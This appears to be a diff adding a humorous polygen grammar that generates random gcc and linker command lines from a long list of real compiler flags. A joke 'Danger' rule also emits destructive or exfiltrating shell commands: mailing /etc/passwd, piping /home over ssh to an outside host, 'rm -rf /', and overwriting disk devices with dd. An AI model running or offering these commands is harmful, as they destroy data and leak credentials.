@@ -1,0 +1,487 @@
+I ::=   "title:    Compilation line\n"
+      ^ "author:   Enrico Zini &lt;enrico@debian.org&gt;\n"
+      ^ "language: english\n"
+      ^ "status:   useable\n"
+      ^ "topic:    Debian\n"
+      ^ "created:  16/09/2006"
+;
+
+(* Run with polygen -X 2000 compileline.grm |randtype -l *)
+
+S ::= Command ;
+
+Command ::= ("g++" | "gcc" | "as" | "cpp" | --"gfortran" | "$CC" ) {Cflags} {"-o" InputFile^".o"} {InputFile^(".c"|".cpp"|".cc"|--".f77")}
+          | ("g++" | "gcc" | "ld" | "ar" | "$LD" ) {Ldflags} {"-o" Filename} {LinkerInput} {Libs}
+	  | ------Danger
+	  ;
+
+Danger ::= "cat /etc/passwd | mail president@whitehouse.gov"
+	  | "tar zcf - /home | ssh" Filename^"@varez.uuae.tg \"tar -C/data/`gentarget` zxf -\""
+	  | "rm -rf" ("/ *"|"~/*")
+	  | "yes | format c: /autotest"
+	  | "dd if=/dev/random of="^Hddev
+	  | "yes `polygen damage` >"^Hddev
+	  | "polygen compileline.grm"
+	  ;
+
+Hddev ::= "/dev/"^(s|h)^d^(a|b|c|d) ;
+
+InputFile := Filename ;
+
+LinkerInput ::= Filename^".o" | LinkerInput (_ | +Filename^".o") ;
+
+Cflags ::= {["-g"]} {["-Wall"]} {["-O"^Opt]} {[Cflag]} {[Cflag]} {[Cflag]} {[Cflag]};
+
+Ldflags ::= ["-L"^LinkDir] ["-L"^LinkDir] ["-L"^LinkDir] ;
+
+Lib ::= "-lm" | "-lstdc++" | "-lz" ;
+Libs ::= _ | Lib Libs ;
+
+Filename ::= test | module | master | slave | main | aux | extra | functions | callbacks | interface | implementation | ui | gui | templates | utils | utilities | funcs | ----porn | ----crack | --unused | db | base | net | network | sockets | --unknown | old | new | -stuff | --oldstuff | ----impossible | --faulty | ok | tested | random | --boss | -foo | -bar | -baz | ---drink | conn | layer | security | http | ftp | protocol | proto | prot | tcp ;
+
+Opt := 0|1|2|3|s;
+
+LinkDir ::= ("/usr" | "/usr/local" | "/opt/"^Filename) ^ "/lib/" ^ Filename ;
+
+Cflag ::= "-ansi"
+	| "-aux-info"
+	| "-BPREFIX"
+	| "-c"
+	| "-C"
+	| "-combine"
+	| "-dD"
+	| "-dI"
+	| "DIR"
+	| "-dLETTERS"
+	| "-dM"
+	| "-dN"
+	| "-dumpmachine"
+	| "-dumpspecs"
+	| "-dumpversion"
+	| "-E"
+	| "-fabi-version="^N
+	| "-falign-functions="^N
+	| "-falign-jumps="^N
+	| "-falign-labels="^N
+	| "-falign-loops="^N
+	| "-fallow-single-precision"
+	| "-fbounds-check"
+	| "-fbranch-probabilities"
+	| "-fbranch-target-load-optimize"
+	| "-fbranch-target-load-optimize2"
+	| "-fbtr-bb-exclusive"
+	| "-fcaller-saves"
+	| "-fcheck-new"
+	| "-fcond-mismatch"
+	| "-fconserve-space"
+	| "-fcprop-registers"
+	| "-fcrossjumping"
+	| "-fcse-follow-jumps"
+	| "-fcse-skip-blocks"
+	| "-fcx-limited-range"
+	| "-fdata-sections"
+	| "-fdelayed-branch"
+	| "-fdelete-null-pointer-checks"
+	| "-fdiagnostics-show-location="^(once|"every-line")
+	| "-fdiagnostics-show-options"
+	| "-fdump-class-hierarchy-"^N
+	| "-fdump-ipa-all"
+	| "-fdump-ipa-cgraph"
+	| "-fdump-translation-unit-"^N
+	| "-fdump-tree-alias"
+	| "-fdump-tree-all"
+	| "-fdump-tree-ccp-"^N
+	| "-fdump-tree-cfg"
+	| "-fdump-tree-ch"
+	| "-fdump-tree-copyrename-"^N
+	| "-fdump-tree-dce-"^N
+	| "-fdump-tree-dom-"^N
+	| "-fdump-tree-dse-"^N
+	| "-fdump-tree-forwprop-"^N
+	| "-fdump-tree-fre-"^N
+	| "-fdump-tree-gimple"^["-raw"]
+	| "-fdump-tree-inlined-"^N
+	| "-fdump-tree-mudflap-"^N
+	| "-fdump-tree-nrv"
+	| "-fdump-tree-optimized-"^N
+	| "-fdump-tree-original-"^N
+	| "-fdump-tree-phiopt-"^N
+	| "-fdump-tree-pre-"^N
+	| "-fdump-tree-salias"
+	| "-fdump-tree-sink"
+	| "-fdump-tree-sra-"^N
+	| "-fdump-tree-ssa-"^N
+	| "-fdump-tree-storeccp-"^N
+	| "-fdump-tree-vcg"
+	| "-fdump-tree-vect"
+	| "-fdump-tree-vrp-"^N
+	| "-fdump-unnumbered"
+	| "-fearly-inlining"
+	| "-feliminate-dwarf2-dups"
+	| "-feliminate-unused-debug-symbols"
+	| "-feliminate-unused-debug-types"
+	| "-fexpensive-optimizations"
+	| "-ffast-math"
+	| "-ffinite-math-only"
+	| "-ffloat-store"
+	| "-fforce-addr"
+	| "-ffor-scope"
+	| "-ffreestanding"
+	| "-ffriend-injection"
+	| "-ffunction-sections"
+	| "-fgcse"
+	| "-fgcse-after-reload"
+	| "-fgcse-las"
+	| "-fgcse-lm"
+	| "-fgcse-sm"
+	| "-fgnu-runtime"
+	| "-fhosted"
+	| "-fif-conversion"
+	| "-fif-conversion2"
+	| "-finline-functions"
+	| "-finline-functions-called-once"
+	| "-finline-limit="^N
+	| "-fivopts"
+	| "-fkeep-inline-functions"
+	| "-fkeep-static-consts"
+	| "-floop-optimize"
+	| "-floop-optimize2"
+	| "-fmem-report"
+	| "-fmerge-all-constants"
+	| "-fmerge-constants"
+	| "-fmessage-length="^N
+	| "-fmodulo-sched"
+	| "-fmove-loop-invariants"
+	| "-fms-extensions"
+	| "-fmudflap"
+	| "-fmudflapir"
+	| "-fmudflapth"
+	| "-fnext-runtime"
+	| "-fno-access-control"
+	| "-fno-asm"
+	| "-fno-branch-count-reg"
+	| "-fno-builtin"
+	| "-fno-builtin-"^Filename
+	| "-fno-const-strings"
+	| "-fno-default-inline"
+	| "-fno-defer-pop"
+	| "-fno-elide-constructors"
+	| "-fno-enforce-eh-specs"
+	| "-fno-for-scope"
+	| "-fno-function-cse"
+	| "-fno-gnu-keywords"
+	| "-fno-guess-branch-probability"
+	| "-fno-implement-inlines"
+	| "-fno-implicit-inline-templates"
+	| "-fno-implicit-templates"
+	| "-fno-inline"
+	| "-fno-math-errno"
+	| "-fno-nil-receivers"
+	| "-fno-nonansi-builtins"
+	| "-fno-operator-names"
+	| "-fno-optional-diags"
+	| "-fno-peephole"
+	| "-fno-peephole2"
+	| "-fno-rtti"
+	| "-fno-sched-interblock"
+	| "-fno-sched-spec"
+	| "-fno-threadsafe-statics"
+	| "-fno-trapping-math"
+	| "-fno-weak"
+	| "-fno-zero-initialized-in-bss"
+	| "-fobjc-call-cxx-cdtors"
+	| "-fobjc-direct-dispatch"
+	| "-fobjc-exceptions"
+	| "-fobjc-gc"
+	| "-fomit-frame-pointer"
+	| "-foptimize-register-move"
+	| "-foptimize-sibling-calls"
+	| "-fpeel-loops"
+	| "-fpermissive"
+	| "-fprefetch-loop-arrays"
+	| "-fprofile-arcs"
+	| "-fprofile-generate"
+	| "-fprofile-use"
+	| "-fprofile-values"
+	| "-frandom-seed="^Filename
+	| "-fregmove"
+	| "-frename-registers"
+	| "-freorder-blocks"
+	| "-freorder-blocks-and-partition"
+	| "-freorder-functions"
+	| "-freplace-objc-classes"
+	| "-frepo"
+	| "-frerun-cse-after-loop"
+	| "-frerun-loop-opt"
+	| "-freschedule-modulo-scheduled-loops"
+	| "-frounding-math"
+	| "-fsched2-use-superblocks"
+	| "-fsched2-use-traces"
+	| "-fsched-spec-load"
+	| "-fsched-spec-load-dangerous"
+	| "-fsched-stalled-insns-dep="^N
+	| "-fsched-stalled-insns="^N
+	| "-fschedule-insns"
+	| "-fschedule-insns2"
+	| "-fsched-verbose="^N
+	| "-fsignaling-nans"
+	| "-fsigned-bitfields"
+	| "-fsigned-char"
+	| "-fsingle-precision-constant"
+	| "-fsplit-ivs-in-unroller"
+	| "-fstack-protector"
+	| "-fstack-protector-all"
+	| "-fstats"
+	| "-fstrength-reduce"
+	| "-fstrict-aliasing"
+	| "-fsyntax-only"
+	| "-ftemplate-depth-"^N
+	| "-ftest-coverage"
+	| "-fthread-jumps"
+	| "-ftime-report"
+	| "-ftracer"
+	| "-ftree-ccp"
+	| "-ftree-ch"
+	| "-ftree-copy-prop"
+	| "-ftree-copyrename"
+	| "-ftree-dce"
+	| "-ftree-dominator-opts"
+	| "-ftree-dse"
+	| "-ftree-fre"
+	| "-ftree-loop-im"
+	| "-ftree-loop-ivcanon"
+	| "-ftree-loop-linear"
+	| "-ftree-loop-optimize"
+	| "-ftree-lrs"
+	| "-ftree-pre"
+	| "-ftree-salias"
+	| "-ftree-sink"
+	| "-ftree-sra"
+	| "-ftree-store-ccp"
+	| "-ftree-store-copy-prop"
+	| "-ftree-ter"
+	| "-ftree-vect-loop-version"
+	| "-ftree-vectorize"
+	| "-ftree-vectorizer-verbose="^N
+	| "-funroll-all-loops"
+	| "-funroll-loops"
+	| "-funsafe-loop-optimizations"
+	| "-funsafe-math-optimizations"
+	| "-funsigned-bitfields"
+	| "-funsigned-char"
+	| "-funswitch-loops"
+	| "-fuse-cxa-atexit"
+	| "-fvariable-expansion-in-unroller"
+	| "-fvar-tracking"
+	| "-fvisibility-inlines-hidden"
+	| "-fvpt"
+	| "-fweb"
+	| "-fwhole-program"
+	| "-fworking-directory"
+	| "-fzero-link"
+	| "-g"
+	| "-gcoff"
+	| "-gdwarf-2"
+	| "-gen-decls"
+	| "-ggdb"
+	| "-g"^N
+	| "-gstabs"
+	| "-gstabs+"
+	| "-gvms"
+	| "-gxcoff"
+	| "-gxcoff+"
+	| "-H"
+	| "--help"
+	| "-I-"
+	| "-IDIR"
+	| "-idirafter"
+	| "-imacros"
+	| "-imultilib"
+	| "-include"
+	| "-iprefix"
+	| "-iquoteDIR"
+	| "-isysroot"
+	| "-isystem"
+	| "-iwithprefix"
+	| "-iwithprefixbefore"
+	| "LANGUAGE"
+	| "-LDIR"
+	| "-M"
+	| "-MF"
+	| "-MG"
+	| "-MM"
+	| "-MP"
+	| "-MQ"
+	| "-MT"
+	| "-no-integrated-cpp"
+	| "-nostdinc"
+	| "-nostdinc++"
+	| "-o"
+	| "-O"
+	| "-O0"
+	| "-O1"
+	| "-O2"
+	| "-O3"
+	| "OPTION"
+	| "-Os"
+	| "-p"
+	| "-P"
+	| "--param"
+	| "-pass-exit-codes"
+	| "-pedantic"
+	| "-pedantic-errors"
+	| "-pg"
+	| "-pipe"
+	| "-print-file-name="^Filename
+	| "-print-libgcc-file-name"
+	| "-print-multi-directory"
+	| "-print-multi-lib"
+	| "-print-prog-name="^Filename
+	| "-print-search-dirs"
+	| "-Q"
+	| "-remap"
+	| "-S"
+	| "-save-temps"
+	| "-specs="^Filename
+	| "--sysroot="^Filename
+	| "--target-help"
+	| "-time"
+	| "-traditional"
+	| "-traditional-cpp"
+	| "-trigraphs"
+	| "-undef"
+	| "-v"
+	| "--version"
+	| "-w"
+	| "-Wabi"
+	| "-Waggregate-return"
+	| "-Wall"
+	| "-Wassign-intercept"
+	| "-Wbad-function-cast"
+	| "-Wcast-align"
+	| "-Wcast-qual"
+	| "-Wc++-compat"
+	| "-Wchar-subscripts"
+	| "-Wcomment"
+	| "-Wconversion"
+	| "-Wctor-dtor-privacy"
+	| "-Wdeclaration-after-statement"
+	| "-Wdisabled-optimization"
+	| "-Weffc++"
+	| "-Werror"
+	| "-Werror-implicit-function-declaration"
+	| "-Wextra"
+	| "-Wfatal-errors"
+	| "-Wfloat-equal"
+	| "-Wformat"
+	| "-Wformat=2"
+	| "-Wformat-nonliteral"
+	| "-Wformat-security"
+	| "-Wformat-y2k"
+	| "-Wimplicit"
+	| "-Wimplicit-function-declaration"
+	| "-Wimplicit-int"
+	| "-Wimport"
+	| "-Winit-self"
+	| "-Winline"
+	| "-Winvalid-pch"
+	| "-Wlarger-than-"^N
+	| "-Wlong-long"
+	| "-Wmain"
+	| "-Wmissing-braces"
+	| "-Wmissing-declarations"
+	| "-Wmissing-field-initializers"
+	| "-Wmissing-format-attribute"
+	| "-Wmissing-include-dirs"
+	| "-Wmissing-noreturn"
+	| "-Wmissing-prototypes"
+	| "-Wnested-externs"
+	| "-Wno-attributes"
+	| "-Wno-deprecated"
+	| "-Wno-deprecated-declarations"
+	| "-Wno-div-by-zero"
+	| "-Wno-endif-labels"
+	| "-Wno-format-extra-args"
+	| "-Wno-import"
+	| "-Wno-int-to-pointer-cast"
+	| "-Wno-invalid-offsetof"
+	| "-Wno-multichar"
+	| "-Wnonnull"
+	| "-Wno-non-template-friend"
+	| "-Wnon-virtual-dtor"
+	| "-Wno-pmf-conversions"
+	| "-Wno-pointer-to-int-cast"
+	| "-Wno-pragmas"
+	| "-Wno-protocol"
+	| "-Wold-style-cast"
+	| "-Wold-style-definition"
+	| "-Woverloaded-virtual"
+	| "-Wpacked"
+	| "-Wpadded"
+	| "-Wparentheses"
+	| "-Wpointer-arith"
+	| "-Wpointer-sign"
+	| "-Wredundant-decls"
+	| "-Wreorder"
+	| "-Wreturn-type"
+	| "-Wselector"
+	| "-Wsequence-point"
+	| "-Wshadow"
+	| "-Wsign-compare"
+	| "-Wsign-promo"
+	| "-Wstack-protector"
+	| "-Wstrict-aliasing"
+	| "-Wstrict-aliasing=2"
+	| "-Wstrict-null-sentinel"
+	| "-Wstrict-prototypes"
+	| "-Wstrict-selector-match"
+	| "-Wswitch"
+	| "-Wswitch-default"
+	| "-Wswitch-enum"
+	| "-Wsystem-headers"
+	| "-Wtraditional"
+	| "-Wtrigraphs"
+	| "-Wundeclared-selector"
+	| "-Wundef"
+	| "-Wuninitialized"
+	| "-Wunknown-pragmas"
+	| "-Wunreachable-code"
+	| "-Wunsafe-loop-optimizations"
+	| "-Wunused"
+	| "-Wunused-function"
+	| "-Wunused-label"
+	| "-Wunused-parameter"
+	| "-Wunused-value"
+	| "-Wunused-variable"
+	| "-Wvariadic-macros"
+	| "-Wvolatile-register-var"
+	| "-Wwrite-strings"
+	| "-x"
+	| "-Xassembler"
+	| "-Xpreprocessor"
+	;
+
+N := 0|1|2|3|4|5|6|7|8|9;
+
+
+
+
+
+
+
+
+
+
+
+(*
+
+
+nker Options_
+     *Note Options for Linking: Link Options.
+          OBJECT-FILE-NAME  -lLIBRARY
+          -nostartfiles  -nodefaultlibs  -nostdlib -pie -rdynamic
+          -s  -static  -static-libgcc  -shared  -shared-libgcc  -symbolic
+          -Wl,OPTION  -Xlinker OPTION
+          -u SYMBOL
+
+*)
